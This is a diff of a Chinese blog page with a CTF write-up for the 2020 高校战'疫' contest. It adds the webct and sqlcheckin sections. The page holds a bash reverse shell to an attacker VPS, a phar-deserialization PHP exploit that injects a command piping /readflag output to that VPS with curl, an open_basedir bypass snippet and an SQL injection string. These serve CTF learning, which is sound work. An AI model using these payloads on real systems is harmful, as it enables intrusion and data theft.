@@ -6,21 +6,21 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，俺果然是菜鸡 Session反序列">
+    <meta name="description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF webct sqlcheckin    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，">
 <meta name="keywords" content="Web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[高校战“疫”网络安全分享赛] 部分WriteUp">
 <meta property="og:url" content="/2020/03/09/高校战疫联赛部分Writeup/index.html">
 <meta property="og:site_name" content="dkk-blog">
-<meta property="og:description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，俺果然是菜鸡 Session反序列">
+<meta property="og:description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF webct sqlcheckin    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="/2020/03/09/高校战疫联赛部分Writeup/1.png">
 <meta property="og:image" content="/2020/03/09/高校战疫联赛部分Writeup/2.png">
 <meta property="og:image" content="/2020/03/09/高校战疫联赛部分Writeup/3.png">
-<meta property="og:updated_time" content="2020-03-09T17:25:22.323Z">
+<meta property="og:updated_time" content="2020-03-12T03:15:44.798Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[高校战“疫”网络安全分享赛] 部分WriteUp">
-<meta name="twitter:description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，俺果然是菜鸡 Session反序列">
+<meta name="twitter:description" content="[高校战“疫”网络安全分享赛] 部分WriteUp[TOC]    前言 Hackme Session反序列化 Bypass $url   PHP-UAF webct sqlcheckin    前言我太菜了，记录一下Web题目 Hackmehttp://121.36.222.22:88/?page=index看到链接还想会不会是目录穿越任意文件读取什么的还试了试../../../../flag，">
 <meta name="twitter:image" content="/2020/03/09/高校战疫联赛部分Writeup/1.png">
     
     
@@ -105,7 +105,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">[高校战“疫”网络安全分享赛] 部分WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.2.</span> <span class="toc-text">Hackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.1.</span> <span class="toc-text">Session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bypass $url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.3.</span> <span class="toc-text">PHP-UAF</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">[高校战“疫”网络安全分享赛] 部分WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.2.</span> <span class="toc-text">Hackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.1.</span> <span class="toc-text">Session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bypass $url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.3.</span> <span class="toc-text">PHP-UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.4.</span> <span class="toc-text">webct</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.5.</span> <span class="toc-text">sqlcheckin</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -160,6 +160,8 @@
 </ul>
 </li>
 <li><a href="#php-uaf">PHP-UAF</a></li>
+<li><a href="#webct">webct</a></li>
+<li><a href="#sqlcheckin">sqlcheckin</a></li>
 </ul>
 <!-- tocstop -->
 
@@ -192,6 +194,14 @@
 <p>把<code>payload1.txt</code>中间的IP换成自己vps的，然后放反弹shell<code>bash -i &gt;&amp; /dev/tcp/vpsip/2333 0&gt;&amp;1</code><br>监听端口，<code>cat /flag</code></p>
 <h2><span id="php-uaf">PHP-UAF</span></h2><p>老题了（第一次好像是2019EIS—ezpass），直接上exp了<br>exp.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_ basedir'</span>, <span class="string">'/tmp'</span>);</span><br><span class="line">mkdir(<span class="string">'sub'</span>);</span><br><span class="line">chdir(<span class="string">'sub'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line">pwn(<span class="string">"/readflag"</span>);</span><br><span class="line"><span class="comment">//https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</span></span><br><span class="line">(下面太长了就不粘贴出来了，二进制👴写的咱也看不懂</span><br></pre></td></tr></table></figure>
+
+<h2><span id="webct">webct</span></h2><p>给了一个远程mysql的服务，和上传<br><code>www.zip</code>源码泄漏</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$a = <span class="keyword">new</span> Listfile(<span class="string">'/;/readflag; curl http://vpsip/`/readflag`'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> Fileupload($a);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>,<span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">"1.phar"</span>, <span class="string">"1.gif"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>rogue mysq server 触发⼀下<br><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a><br>将filelist改为算好的<code>phar</code>路径</p>
+<h2><span id="sqlcheckin">sqlcheckin</span></h2><p>查看源码，给了部分源码，<code>PDO</code>注入的话只见过宽字节</p>
+<p><code>select * from users where username = &#39;admin&#39;-0-&#39;&#39;;</code></p>
+
   </div>
 </article>
 
@@ -216,7 +226,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">[高校战“疫”网络安全分享赛] 部分WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.2.</span> <span class="toc-text">Hackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.1.</span> <span class="toc-text">Session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bypass $url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.3.</span> <span class="toc-text">PHP-UAF</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">[高校战“疫”网络安全分享赛] 部分WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.2.</span> <span class="toc-text">Hackme</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.1.</span> <span class="toc-text">Session反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bypass $url</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.3.</span> <span class="toc-text">PHP-UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.4.</span> <span class="toc-text">webct</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.5.</span> <span class="toc-text">sqlcheckin</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
